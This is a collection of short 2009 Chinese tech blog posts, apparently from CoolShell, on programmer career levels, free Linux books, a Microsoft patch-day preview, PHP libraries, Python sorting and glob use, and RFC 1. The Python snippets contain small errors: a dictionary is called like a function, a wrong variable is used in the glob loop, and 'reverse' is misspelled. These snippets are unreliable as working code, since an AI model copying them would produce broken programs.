这一级别是程序员的最高级别。你的代码比你的生命活的还长，当你死后，你将会成为整个历史的一部分。其它程序员对你顶礼膜拜，或许你会获得计算机最高奖“图灵奖”，不然就是一系列极其影响力的论文，再不然，就是发明了一些可以影影响整个编程界根基的技术。你拥有的不仅仅是在维基百科上的一个词条，还会有一个专门的网站来研究你的生平和你的工作成果。

比如：[Dijkstra](https://en.wikipedia.org/wiki/Edsger_W._Dijkstra), [Knuth](https://en.wikipedia.org/wiki/Donald_Knuth)（编程艺术的作者）, [Kay](https://en.wikipedia.org/wiki/Alan_Kay)

 

**第七级 成功的程序员**

这类程序员一方面很著名，另一方面在商业上也很成功，他们影响了整个工业界。他们似乎决定了工业界中发展的方向，这些人，自己的编程能力固然了得，但估计他们的Business方面的能力应该大于他们编程的能力。（我个人认为[Linus](https://en.wikipedia.org/wiki/Linus_Torvalds)应该属于这一类）

比如： [Gates](https://en.wikipedia.org/wiki/Bill_Gates)（比尔盖茨）, [Carmack](https://en.wikipedia.org/wiki/John_D._Carmack)（Doom和Quake 3D游戏）, [DHH](https://en.wikipedia.org/wiki/David_Heinemeier_Hansson) （Ruby on Rail的创建者）

 

**第六级 著名程序员**

这一类的程序员，在编程圈子内比较有名气，但是他们的这种名气并不一定能给他们带来某种利益。名气是一件好事，但是成功可能更好一些，这类人一般正在给一个很著名的大的公司，或是是一极具影响力的小公司里工作，或者正在创建自己的事业。无论怎么样，其它的程序员听说过你的名字，并以你为榜样在效仿着你。

 

**第五级 骨干程序员**

这类程序员一般来说都是公司里的骨干份子，他们担任着公司内最重要的编程角色，在公司内部，他们受到老板和其它程序员的尊敬，他们不会失业，因为他们随时都可以很容易地找到工作。他们工作过的公司都会因为他们而有所发展。

 

**第四级 一般的程序员**

这类程序员的优点在于，他们很清楚地意识到了自己可能这一辈了也无法成为一个伟大的程序员。天才只是很少的一部分人。如果这类程序员有一些商业和人员管理能力，他们也会在公司里相当的成功。“认识自我”并不简单，这并不是一般人能做到的，能够认识自己的人已经是很不错了，找到自己的长处，并像那个方向努力，一定也会很成功的。因为在公司里，并不只有程序员一种职位，经理，PM，流程，SQA，技术支持，售前，管理员，测试人员等等都可能会让这类程序员有更为广阔的天空。

 

**第三级 业余的程序员**

这类人员不管是不是计算机科班出身，基础如何，他们对编程有着特殊的爱好，他们可能会是一些很有前途的学生或实习生，也许他们可能会给开源做一些贡献（比如说提供一些语言包或是一些插件什么的），有时候，他们也会写两个小工具软件放在网上让人下载，也行有些时候就是为了玩玩而开发一些小程序而打发一下他们空闲的时间。他们完全是靠热情和承诺来编程。兴趣永远是最好的老师，也是最好的一件事，因为兴趣而引发的热情通常会让这些程序员成为“骨干程序员”。

 

**第二级 不知名的程序员**

这一级的程序员是典型的为大众所知的程序员，他们有一定的编程能力，但并不出众，也许他们会在一家大公司里工作，只程序员只不过是他们的工作而已，并不是他们人生的全部。当然，这样的程序员也挺好的。必竟，平凡地人还是大多数，平凡地活着也没有什么错的。

 

**第一级 糟糕的程序员**

这类程序员不知道为什么就走上了编程这条路，他们甚至连最基本的编程经验和能力都没有。所有被他们碰过的事情都需要他们的同事重头再返工一遍，他们根本不就是程序员。程序员这个职位对于他们可能就是一个错误。

正如原文作者所说，“这些级别并不是很严肃的，也并不是每个程序都会去思考一下自己的未来，但是这些级别可能会让你去想一想从事程序员十年/二十年/三十年后，自己可能变成什么样。”

文章：[来源](http://www.codinghorror.com/blog/archives/001250.html)

# 20本最好的LINUX免费书籍

前些天Neo推荐了一个网站有《[超过100本的linux免费书籍](https://coolshell.cn/articles/336.html)》，这里，我也向大家推荐20本最好的Linux免费书籍，当然，也是英文版的。

**1. Ubuntu Pocket Guide and Reference**

一本介绍关于Ubuntu 8.04和8.10的使用书。



| Website | [www.ubuntupocketguide.com](http://www.ubuntupocketguide.com/) |
| ------- | ------------------------------------------------------------ |
| Author  | Keir Thomas                                                  |
| Format  | PDF                                                          |
| Pages   | 152                                                          |



**2. Two Bits**

一本关于自由软件的历史和文化的书。不当当是软件，同样也有音乐，电影，科学和教育。



| Website | [twobits.net](http://twobits.net/) |
| ------- | ---------------------------------- |
| Author  | Christopher M. Kelty               |
| Format  | PDF                                |
| Pages   | 400                                |



**3. The Linux Starter Pack**

一本完整的介绍如何使用Linux的书。可以让你从入门级提高到中级。主要是教你如果操作Linux桌面。



| Website | [www.tuxradar.com/linuxstarterpack](http://www.tuxradar.com/linuxstarterpack) |
| ------- | ------------------------------------------------------------ |
| Author  | Future Publishing                                            |
| Format  | PDF                                                          |
| Pages   | 130                                                          |

**4. The Easiest Linux Guide You’ll Ever Read**

本书主要面对Windows的用户，本书教你如何使用linux完全一些Windows的事情。本书主要是给用户一个体验以告诉你Linux的强大和迷人。



| Website | [www.suseblog.com](http://www.suseblog.com/my-book-the-easiest-linux-guide-youll-ever-read-an-introduction-to-linux-for-windows-users) |
| ------- | ------------------------------------------------------------ |
| Author  | Scott Morris                                                 |
| Format  | PDF                                                          |
| Pages   | 160                                                          |

 

**5. Producing Open Source Software**

本书主要介绍了开源的软件方面的事情，比如一个开源的项目如何创建，如何组织，如何管理，并介绍了一些开源的文化。这不是一本技术书，这是一本管理或是介绍开源的工程书籍。



| Website | [producingoss.com](http://producingoss.com/)    |
| ------- | ----------------------------------------------- |
| Author  | Karl Fogel                                      |
| Format  | PDF, XML, Single HTML page, Multiple HTML pages |
| Pages   | 192                                             |

**6. Introduction to Linux – A Hands on Guide**

又一本Linux的手册书，涵盖了诸如：文件系统，进程，I/O，VIM，打印，备份，网络和多媒体。



| Website | [tille.garrels.be/training/tldp/](http://tille.garrels.be/training/tldp/) |
| ------- | ------------------------------------------------------------ |
| Author  | Machtelt Garrels                                             |
| Format  | PDF, HTML                                                    |
| Pages   | 215                                                          |

**7. Bash Guide for Beginners**

一本教你使用Bash编程的书。



| Website | [tille.garrels.be/training/bash](http://tille.garrels.be/training/bash/) |
| ------- | ------------------------------------------------------------ |
| Author  | Machtelt Garrels                                             |
| Format  | PDF, HTML                                                    |
| Pages   | 165                                                          |

**8. After the Software Wars**

这本书描述了整个计算机软件开发中的好的和不好的东西。其中也暗示了很多今天的东西。



| Website | [www.lulu.com/content/4964815](http://www.lulu.com/content/4964815) |
| ------- | ------------------------------------------------------------ |
| Author  | Keith Curtis                                                 |
| Format  | PDF                                                          |
| Pages   | 292                                                          |

**9. The Cathedral & The Bazaar**

这是一本关于软件工程的方法论，其主要总结了Linux内核，开源项目中带用的软件开发的方法。



| Website | [www.catb.org/~esr/writings/cathedral-bazaar/](http://www.catb.org/~esr/writings/cathedral-bazaar/) |
| ------- | ------------------------------------------------------------ |
| Author  | Eric S. Raymond                                              |
| Format  | PDF, XHTML, XML, Postscript                                  |
| Pages   | 260                                                          |

**10. Free for All: How LINUX and the Free Software Movement Undercut the High-Tech Titans**

又是一本介绍软件开发中政治方面的书。



| Website | [wayner.org/node/5](http://wayner.org/node/5)     |
| ------- | ------------------------------------------------- |
| Author  | Peter Wayner                                      |
| Format  | PDF, Zipped HTML, Palm PDB, HTML, ASCII text, XML |
| Pages   | 340                                               |

**11. Put Yourself in Command**

介绍Linux命令的书。



| Website | [en.flossmanuals.net/gnulinux](http://en.flossmanuals.net/gnulinux) |
| ------- | ------------------------------------------------------------ |
| Author  | Free Software Foundation                                     |
| Format  | PDF, Multi-page HTML                                         |
| Pages   | 136                                                          |

**12. Getting Started with OpenOffice.org 3.x**

使用OpenOffice的书。



| Website | [documentation.openoffice.org](http://documentation.openoffice.org/) |
| ------- | ------------------------------------------------------------ |
| Author  | OOoAuthors group                                             |
| Format  | PDF, Multi-page HTML                                         |
| Pages   | 433                                                          |

**13. Grokking the GIMP**



| Website | [gimp-savvy.com/BOOK](http://gimp-savvy.com/BOOK/) |
| ------- | -------------------------------------------------- |
| Author  | Carey Bunks                                        |
| Format  | HTML                                               |
| Pages   | 352                                                |

**14. The Linux Knowledge Base and Tutorial**

一个Linux的技术知识库。



| Website | [sourceforge.net/projects/linkbat](http://sourceforge.net/projects/linkbat) |
| ------- | ------------------------------------------------------------ |
| Author  | James Mohr                                                   |
| Format  | PDF                                                          |
| Pages   | 614                                                          |

 

**15. Advanced Linux Programming**

用大量的示例介绍了Linux下编程最重要的概念和技术。



| Website | [www.advancedlinuxprogramming.com](http://www.advancedlinuxprogramming.com/) |
| ------- | ------------------------------------------------------------ |
| Author  | CodeSourcery LLC                                             |
| Format  | Multiple PDFs                                                |
| Pages   | 344                                                          |

 

**16. Linux 101 & 102 Modular Training Notes**



| Website | [www.ledge.co.za/software/lpinotes](http://www.ledge.co.za/software/lpinotes/) |
| ------- | ------------------------------------------------------------ |
| Author  | Leading Edge Business Solutions                              |
| Format  | PDF                                                          |
| Pages   | 233 (Linux 101), 236 (Linux 102)                             |

 

**17. Linux Device Drivers, Third Edition**

介绍Linux内核2.6以上版的内核方面的驱动开发。



| Website | [oreilly.com/catalog/9780596005900](http://oreilly.com/catalog/9780596005900/) |
| ------- | ------------------------------------------------------------ |
| Author  | Jonathan Corbet, Allesandro Rubini, Greg Kroah-Hartman       |
| Format  | PDF, HTML, DocBook                                           |
| Pages   | 615                                                          |

**18. LINUX: Rute User’s Tutorial and Exposition**

一本技术参考手册，主要面对高级系统管理员。



| Website | [linux.2038bug.com](http://linux.2038bug.com/) |
| ------- | ---------------------------------------------- |
| Author  | Paul Sheer                                     |
| Format  | PDF, HTML                                      |
| Pages   | 660                                            |

**19. Linux Network Administrator’s Guide – 2nd Edition**



| Website | [tldp.org/guides.html](http://tldp.org/guides.html) |
| ------- | --------------------------------------------------- |
| Author  | Olaf Kirch, Terry Dawson                            |
| Format  | PDF, HTML                                           |
| Pages   | 489                                                 |

**20. tuXlabs Cookbook**



| Website | [www.upfrontsystems.co.za](http://www.upfrontsystems.co.za/Members/jean/cookbook/tuXlab01.pdf/view) |
| ------- | ------------------------------------------------------------ |
| Author  | Jean Jordaan, The Shuttleworth Foundation                    |
| Format  | PDF                                                          |
| Pages   | 153                                                          |

文章：[来源](http://www.linuxlinks.com/article/20090405061458383/20oftheBestFreeLinuxBooks-Part1.html)

# LINUX C 编程一站式学习

个人认为这是一个挺不错的从C语言到Linux系统开发的教程，这本是两个网上的文档。

- 其中 一本是《How To Think Like A Computer Scientist: Learning with C++ 》作者Allen B. Downey。原书由Green Tea Press发行，可以从http://www.greenteapress.com/下载到。
- 另一本是：《Programming from the Ground Up: An Introduction to Programming using Linux Assembly Language》作者Jonathan Bartlett。原书由Bartlett Publishing发行，可以从http://savannah.nongnu.org/projects/pgubook/下载到。

不过非常高兴的是有要把这两个文档都翻译成了中文。当然，翻译工作还没有完全完成，第三部分还很粗糙，错误也有不少，有待改进。第一部分和第二部分已经比较成熟，第二部分还差三章没写。不过现在可以阅读了。

下面是这个文档的网站链接：

http://learn.akae.cn/media/index.html

# 1980年和2009年的1GB电脑内存的比较

从1980年到现在，我们的科技到底进步了多少：）

下面这个图说明了1980年大机的1GB的内存和2009年的1GB的内存。

[![1gb-computer-memory](photo/1gb-computer-memory.jpg)](https://coolshell.cn/?attachment_id=412)

# 4月14日，微软补丁日

下周二，微软准备release至少8个以上的安全补丁，如下表所示。目前没有太多的信息，不过，我们知道的是其中Excel的那个BUG早在2月份的时候就报告了，http://www.microsoft.com/technet/security/advisory/968272.mspx，可是这么长的时候后才有patch。哎。

这次的BUG数之多，覆盖面之广（包括IE，Office，DirectX，Windows …），看来，下周二各个公司的IT部门又有得忙了。

| ***\*编号\**** | ***\*严重程度\**** | ***\*攻击方式\**** | ***\*重启\**** | ***\*影响的软件\*\****               |
| -------------- | ------------------ | ------------------ | -------------- | ------------------------------------ |
| Windows1       | 严重               | 远程代码运行       | 需要重启       | Microsoft Windows, Microsoft Office  |
| Windows2       | 严重               | 远程代码运行       | 需要重启       | Microsoft Windows                    |
| Windows3       | 严重               | 远程代码运行       | 可能需要重启   | Microsoft Windows                    |
| IE             | 严重               | 远程代码运行       | 需要重启       | Microsoft Windows, Internet Explorer |
| Excel          | 严重               | 远程代码运行       | 可能需要重启   | Microsoft Office                     |
| Windows4       | 重要               | 获取更高权限       | 需要重启       | Microsoft Windows                    |
| ISA            | 重要               | 拒绝式服务         | 需要重启       | Microsoft Forefront Edge Security    |
| Windows5       | 中级               | 获取更高权限       | 需要重启       | Microsoft Windows                    |

相关信息可以参看这里：

http://www.microsoft.com/technet/security/bulletin/ms09-apr.mspx

# PDF电子书搜索引擎

这是一个PDF电子书的搜索引擎，可以搜索到很多PDF的图书，包括中文的。

#### [![PDF Book Search](http://search-pdf-books.com/i/m_11.png) http://search-pdf-books.com/ ](http://search-pdf-books.com/)

简单的试了一下，的确很不错，推荐给大家。

# 程序员需要具备的基本技能

软件开发是一个跨度很大的技术工作，在语言方面，有C，C++，Java，Ruby等等等等，在环境方面，又分嵌入式，桌面系统，企业级，WEB，基础系统，或是科学研究。但是，不管是什么的情况，总是有一些通用的基本职业技能。

这些最基本的职业技能通常决定了一个程序员的级别，能否用好这些技能，直接关系到了程序员的职业生涯。很多程序新手也是因为缺少、达不到或是不熟悉在这些基本技能，所以，他们需要有老手带，需要努力补齐这些技能。而高级程序员应该非常熟悉这些基本技能，而且有能力胜任并带领其他经验不足的程序员。

下面这些基本职业技术可以用来做为对一个程序员的评估，很明显，下面的这些技能都可以用来做面试。虽然，还有很多非技术的因素，但对于评估一个程序员的技术能力来说，其应该是足够的了。

下面是程序员所应该具备的基本职业技能：



| 基本技能         | 技能描述                                                     |
| :--------------- | :----------------------------------------------------------- |
| 阅读代码         | 这个技能需要程序员能够具备读懂已经存在的代码的能力，这样的能力可以让程序员分析程序的行为，了解程序，这样才能和开发团队一起工作，继承维护或是改进现有的程序。 |
| 编写程序         | 编写程序并不包括程序设计。不要以为编程是一件很简单的事情，很多程序员都认为编程只需要懂得程序语言的语法，并把设计实现就可以了。但是这离编写程序还远远不够，使用什么样的编码风格成为编写程序员最需要具备的基本技能。能否使用非常良好的编程风格直接决写了程序员的级别。 |
| 软件设计         | 这一能力直接决定了需要吏用什么样的代码技术达到怎么样的功能，而系统架构设计直接决定了软件的质量、性能和可维护性。并不是所有的程序在这一方面都非常优秀，但每个程序员都需要或多或少的明白和掌握这一基本技能。 |
| 熟悉软件工程     | 每个程序员都应该明白软件工程是什么东西，都应该知道，需求分析，设计，编码，测试，Release和维护这几个阶段。当然，几乎所有的人都知道这些东西，但并不是每个人都很清楚这些东西。现在很多高级程序员都会混淆“需求规格说明书FS”和“概要设计HLD”。另外，程序员还需要知道一些软件开发的方法论，比如：敏捷开发或瀑布模型。 |
| 使用程序库或框架 | 一个程序员需要学会使用已有的代码，无论是标论的程序库，或是第三方的，还是自己公司内部的，都需要学会做。比如：C++中，需要学会使用STL，MFC，ATL，BOOST，ACE，CPPUNIT等等。使用这些东西，可以让你的工作事半功倍。 |
| 程序调试         | 程序调试是分析BUG和解决问题最直接的能力。没有人能够保证程序写出来不用调试就可以运行正常，也没有人可以保证程序永远不会出BUG。所以，熟练使用调试器是一个程序员需要具备的基本技能。 |
| 使用IDE          | 学会使用IDE工具也会让你的工作事半功倍。比如，VC++，Emacs，Eclipse等等，并要知道这些IDE的长处和短处。 |
| 使用版本控制     | 一定要学会使用版本控制工具，什么叫mainline/trunk，什么叫tag，什么叫branch，怎么做patch，怎么merge代码，怎么reverse，怎么利用版本控制工具维护不同版本的软件。这是程序员需要明的的软件配置管理中最重要的一块。 |
| 单元测试         | 单元测试是每个程序都需要做的。很多单元测试也是需要编码的。一定要学会在xUnit框架下进行单元测试。比如JUnit, NUnit, CppUnit等等。 |
| 重构代码         | 每个程序员都需要有最基本的能力去重构目前已有的代码，使代码达到最优但却不能影响任何的已有的功能。有一本书叫《软件的重构》，每个程序员都应该读一下。 |
| 自动化编译       | 程序员需要使用一个脚本，其能自动化编程所有的工程和代码，这样，整个开发团队可以不停地集成代码，自动化测试，自动化部署，以及使用一些工具进行静态代码分析或是自动化测试。 |

当然，还有很多的基本技术也是非常重要的，比如，与人的沟通能力，语言的表达能力，写作能力，团队协作能力，适应变化的能力，时间管理能力，多任务处理能力，自我学习能力，故障处理能力，等等，等等，这里只是列举了和技术相关的能力，这些是程序最最最基本的能力，只要是程序员就必需要有的能力。

# PYTHON中实现多属性排序

我们有一组记录:

list_records =

(

 (department, name, salary),

 (department, name, salary),

 ...

 (department, name, salary)

)

然后我们想进行类似 MS – Excel 里的 “then sort by” 中的功能一样先基于department排序，然后再在部门内按照salary排序。

其他编程语言可能相对复杂，我这里写出一个用Python实现的最简方法（也许有比这个还短的，来挑战吧）



list_records.sort(

 key = **lambda** l: (l[0], l[2])

)

这个就是函数是编程的好处，可以无中生有的构造出一个没有名字的inline函数。假设我们有另外一个dictionary_age 是保存的 { name: ages }， 我们还可以简单的实现基于外部属性进行排序。例如，如果我们想先按照部门排序，然后在部门里按照年龄排序，我们可以写：

<iframe id="aswift_2" name="aswift_2" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=6868047&amp;adf=3542096678&amp;pi=t.aa~a.425447425~i.15~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684142546&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F435.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biYYw2iC4ix4NBovtu3NqdngscFS9CUR3nrfSDbbPEDHjNKfklOlooibc5RxKwWxcjzNQLn&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142548395&amp;bpp=1&amp;bdt=1330&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3Ddc1b01a5d37ff446-22350a18cee0002f%3AT%3D1684142460%3ART%3D1684142460%3AS%3DALNI_MYTYBwfec2FAfQh3OysKPIhMclwYQ&amp;gpic=UID%3D00000c061d72150b%3AT%3D1684142460%3ART%3D1684142460%3AS%3DALNI_Mbbcc_w6rcekKY5H0QT3wZ0Gc9daA&amp;prev_fmts=0x0%2C1200x280&amp;nras=3&amp;correlator=6453394930051&amp;frm=20&amp;pv=1&amp;ga_vid=1726761036.1684142434&amp;ga_sid=1684142434&amp;ga_hid=180295980&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=1346&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788441%2C44792089%2C44789334&amp;oid=2&amp;psts=ABHeCvjCgsbg9VwQNJ4dpaS6uYwvJkudSLsh6kks0OvESEOvwuEDmlUK0TxkMDDcRDh3srp7wEC3hdMHKUdv_gLT-nPWsUo&amp;pvsid=3066969827437321&amp;tmod=1102801285&amp;uas=0&amp;nvt=2&amp;ref=https%3A%2F%2Fcoolshell.cn%2Farticles%2F435.html&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=3&amp;uci=a!3&amp;btvi=1&amp;fsb=1&amp;xpc=nJhpPUxm1p&amp;p=https%3A//coolshell.cn&amp;dtd=13" data-google-container-id="a!3" data-google-query-id="CPOa2vL_9v4CFUJkKgodoeYMRA" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

list_record.sort(

 key = **lambda** l:( l[0], dictionary_age(l[1]) )

)

如果需要降序排列，可以设置 revserse = True; 如果想基于两个属性，一个升序，一个降序，可以试试将其中一个构造一个外部规则，然后如同上例子中的dictionary_age一样传递进去。

Done!

# 9个强大免费的PHP库

### 1. ReCAPTCHA

[reCAPTCHA ](http://recaptcha.net/plugins/php/) 允许你的网站集成一个Advanced CAPTCHA 系统，这个系统可以帮助你阻止一些垃圾信息。可视化的CAPTCHA 同样也有一个有用的声音功能。另外，在reCAPTCHA 服务里，这个PHP库也包含了一个给 “Mailhide” 服务用的API，这个可以把你的邮件地址隐藏于一些抓邮件地址的程序。

这个API是免费并且非常容易使用的，你需要做的就是申请一个API的KEY。

![ReCAPTCHA](photo/recaptcha.png)

[下载 ReCAPTCHA](https://code.google.com/p/recaptcha/downloads/list?q=label:phplib-Latest) | [获取一个API Key](http://recaptcha.net/api/getkey?app=php) | [相关文档](http://recaptcha.net/plugins/php/)



### 2. Akismet

[Akismet](http://akismet.com/) 是一个免费的服务项目，对于一些小型的网站它是完全免费的，对于一些大型的网址，他是部分免费的。这个库也是提供了处理一些和垃圾信息相关的功能。它主要通过比对自己数据库中已存在的被认定为垃圾的信息，而做出决定的。当然，数据库中的垃圾信息可能通过各个网站举报，大家供享的。这是一个每天都在更新，每天都在改进的库。许多许多的WordPress都装有这个库。

![Akismet](photo/akismet.jpg)

[实施Akismet](http://net.tutsplus.com/tutorials/tools-and-tips/the-best-ways-to-fight-spam/)

### 3. Services_JSON

JSON 是一个非常小巧敏捷的PHP库，它主要用于把一些数据格式转成易于人们阅读的格式。并不是所有的人都会喜欢PHP5 （因为自PHP5.20后其中已经集成了JSON），所以，这个小PHP库可以在低版本的PHP中让你得到 JSON 的功能。

![JSON](photo/json.png)

[查看 Services_JSON](http://pear.php.net/package/Services_JSON)

### 4. Smarty

[Smarty](http://smarty.net/) 是一个网面模板引擎，它主要是把程序和界面分开。Smarty 提供了许多强大的功能，比如循环，变量，以及一个强大的缓存系统。这个库不是一个新库了，其已经发展了很多年了，虽然只有3个release版，但应该是比较成熟了。

![Smarty](photo/smarty.png)

[下载 Smarty](http://smarty.net/download.php) | [查看文档](http://smarty.net/docs.php)

### 5. pChart

这是一个强大的画统计图的PHP库，像一些饼图或是柱状图，[pChart](http://pchart.sourceforge.net/index.php) 还允许你通过SQL查询语句或是手动的输入数据来创建一个统计图。当然它需要GD库的支持以便创建图片。这个库一看就是有很多非常专业的美工设计过，因为它可以让你的统计图显示的相当漂亮。

![pChart](photo/pchart.png)

[下载 pChart](http://pchart.sourceforge.net/download.php) | [相关文档](http://pchart.sourceforge.net/documentation.php) | [查看演示](http://pchart.sourceforge.net/demo.php)

### 6. SimplePie

[SimplePie](http://simplepie.org/) 允许你可以容易地 pull 一些信息，比如RSS feeds。它同样可以被集成于不同的平台和语言。并且可以通过很多不同的方法来处理远端的feed。

![SimplePie](photo/simplepie.png)

[下载 SimplePie](http://simplepie.org/downloads/) | [相关文档](http://simplepie.org/wiki/) | [Extending SimplePie to Parse Unique RSS Feeds](http://net.tutsplus.com/videos/screencasts/extending-simplepie-to-parse-unique-rss-feeds/)

### 7. XML-RPC PHP

我们的应用程序有时需要一些类似于 “ping” 的功能去探测一下其它站点，如BLOG的 trackbacks。一般来说，这都是通过一个叫做XML-RPC的协议来完成的。[XML-RPC PHP](http://phpxmlrpc.sourceforge.net/) 库可以让你的站点集成这些功能。

![XML-RPC](photo/xmlrpc.png)

[下载 XML-RPC PHP](http://phpxmlrpc.sourceforge.net/#download) | [相关文档](http://phpxmlrpc.sourceforge.net/#interest)

### 8. Amazon S3

Amazon 提供了一个“云服务”叫”S3″. 这个PHP库可以让你不需要第三方的插件就可以上传大的文件。

![Amazon S3](photo/s3.png)

[下载 Amazon S3 PHP 类](https://amazon-s3-php-class.googlecode.com/files/s3-php5-curl_0.3.9.tar.gz)

### 9. PHPMailer

很多应用都需要对外发送邮件，但是PHP的mail() 函数并不是特别好用。于是 PHPMailer 应运而生，这是一个功能强大的类，其允许你发送不同格式的邮件，并支持附件和自定义邮件头。

![Sending Mail](photo/mail.png)

[下载 PHPMailer](http://phpmailer.codeworxtech.com/index.php?pg=sf&p=dl) | [相关文档](http://phpmailer.codeworxtech.com/index.php?pg=tutorial)

文章：[来源](http://net.tutsplus.com/articles/web-roundups/9-extremely-useful-and-free-php-libraries/)

# PYTHON脚本如何对文件通配符匹配

有时候，我们可能会写一些轻量级的脚本去处理很多符合某种pattern的文件，例如“某目录下的 *logfile.csv” 但是，我们大多数脚本的参数都是 sys.argv, 如何解析 wildcard 匹配呢？

#### test.py

 **from** *glob* **import** glob

...

**if** __name__ == "__main__":

​    file_names = glob(sys.argv[1])

​    **for** file_name **in** file_names:

​        do_something(file) 

<iframe id="aswift_2" name="aswift_2" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="0" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=3491772358&amp;adf=244825601&amp;pi=t.aa~a.425447425~i.5~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684142659&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F444.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biKtEHpTDje7bQk9xoRzwmOQeEXAeTnkXOeMmgi-YqOOTOWzTBA-lZmNIjzQeoxFcyM2bV6&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142661448&amp;bpp=1&amp;bdt=1546&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3Ddc1b01a5d37ff446-22350a18cee0002f%3AT%3D1684142460%3ART%3D1684142460%3AS%3DALNI_MYTYBwfec2FAfQh3OysKPIhMclwYQ&amp;gpic=UID%3D00000c061d72150b%3AT%3D1684142460%3ART%3D1684142460%3AS%3DALNI_Mbbcc_w6rcekKY5H0QT3wZ0Gc9daA&amp;prev_fmts=0x0%2C1200x280&amp;nras=3&amp;correlator=8696484632629&amp;frm=20&amp;pv=1&amp;ga_vid=1726761036.1684142434&amp;ga_sid=1684142434&amp;ga_hid=665969424&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=820&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31074198%2C44785293%2C44788441%2C44790154&amp;oid=2&amp;pvsid=3550266844810547&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F68&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=3&amp;uci=a!3&amp;btvi=1&amp;fsb=1&amp;xpc=eyQPZPEMFa&amp;p=https%3A//coolshell.cn&amp;dtd=81753" data-google-container-id="a!3" data-google-query-id="CKXsy8-A9_4CFZACXAodMGADwg" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 0px;"></iframe>

这样就可以像使用其他终端命令一样使用脚本test.py 进行wildcard匹配了

#### >> test.py ./*logfile.csv

# RFC1 40岁生日

昨天（2009年4月7日）是RFC 1的40岁生日。注意，这不是KFC，而是RFC。;-)

1969年的今天，我们有一第一个RFC（http://www.faqs.org/rfcs/rfc1.html）。这成为了以后整个Internet的基础。

所谓RFC，全称为Request For Comments ，是一系列以编号排定的文件。文件收集了有关互联网相关资讯，以及UNIX和互联网社群的软件文件。目前RFC文件是由Internet Society（ISOC）所赞助发行。

